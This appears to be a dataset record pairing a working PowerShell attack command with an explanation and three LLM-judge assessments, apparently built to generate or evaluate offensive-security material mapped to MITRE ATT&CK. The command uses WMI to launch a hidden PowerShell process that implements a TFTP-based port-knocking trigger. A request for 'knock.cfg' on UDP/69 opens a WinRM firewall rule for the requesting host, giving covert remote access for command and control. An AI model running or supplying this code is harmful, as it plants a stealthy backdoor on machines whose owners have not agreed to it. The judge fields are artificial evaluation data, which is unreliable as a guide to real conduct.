command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(69); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 4 -and $d[0] -eq 0 -and $d[1] -eq 1){ $i=2; $bytes=@(); while($i -lt $d.Length -and $d[$i] -ne 0){ $bytes+=$d[$i]; $i++ }; $fn=[Text.Encoding]::ASCII.GetString($bytes,0,$bytes.Length); if($fn -eq ''knock.cfg''){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-TFTP'' -Enabled True -RemoteAddress $ep.Address; break } } } }'
explanation: Monitors TFTP (UDP/69) RRQ packets (opcode 0x0001) and parses the filename field. A request for 'knock.cfg' serves as the signal to enable the WinRM HTTPS firewall rule for the requesting host.
rationale_steps: Create disabled inbound rule for TCP/5986.
Bind to UDP/69 and parse RRQ (opcode 1) filename per TFTP format.
Enable the firewall rule when the sentinel filename is requested.

llm_judgments.syntactic_justification: The command is well-formed with balanced quotes/braces, proper escaping of embedded single quotes, and a valid PowerShell/WMI invocation structure.
llm_judgments.semantic_justification: It implements a TFTP RRQ-based signal to toggle a specific WinRM firewall rule (aligned with T1205), but changing firewall rules requires admin privileges (contradicting 'Privilege: None') and inbound UDP/69 may be blocked, reducing operational plausibility.

llm_judgments.syntactic_justification: The command is largely well-formed with proper PowerShell constructs, balanced braces, and correct quoting using doubled single-quotes for inner strings within the outer single-quoted ArgumentList, though the nested quoting complexity creates edge cases that could cause parsing issues in some environments.
llm_judgments.semantic_justification: The command accurately implements a TFTP-based port-knocking mechanism (T1205) by listening on UDP/69, parsing TFTP RRQ opcodes (0x0001) and filename fields per RFC 1350, and using a specific filename 'knock.cfg' as the traffic signal to dynamically enable a WinRM HTTPS firewall rule scoped to the requesting IP, which is a highly realistic and operationally coherent implementation of traffic signaling for C2 access control.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correctly doubled single-quotes to escape the inner script block within the WMI argument string, and properly handles PowerShell syntax for the UDP listener and firewall manipulation.
llm_judgments.semantic_justification: The command perfectly implements the Traffic Signaling technique by monitoring a low-level protocol (TFTP) for a specific trigger (the filename 'knock.cfg') to dynamically modify firewall rules for command and control access (WinRM).
